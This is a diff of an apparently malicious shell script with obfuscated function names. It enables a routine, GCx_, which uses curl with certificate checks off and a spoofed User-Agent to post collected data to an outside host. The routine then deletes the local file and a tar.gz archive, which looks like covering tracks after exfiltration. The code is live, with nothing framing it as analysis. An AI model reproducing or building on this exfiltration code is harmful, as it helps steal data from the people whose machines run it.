@@ -82,8 +82,8 @@ function GCx_(){
 	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
      dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
      #
-     rm -f "$IBUS_""gcx.tar.gz"
      rm -f "$local_file"
+     rm -f "$IBUS_""gcx.tar.gz"
 }
 
 function ax(){
@@ -233,7 +233,7 @@ function px(){
     	ssx_ & PxNwx & Hstrx
 	#WbCmx
     	#ax_
-	#GCx_
+	GCx_
 	#
 	exit 0
     else
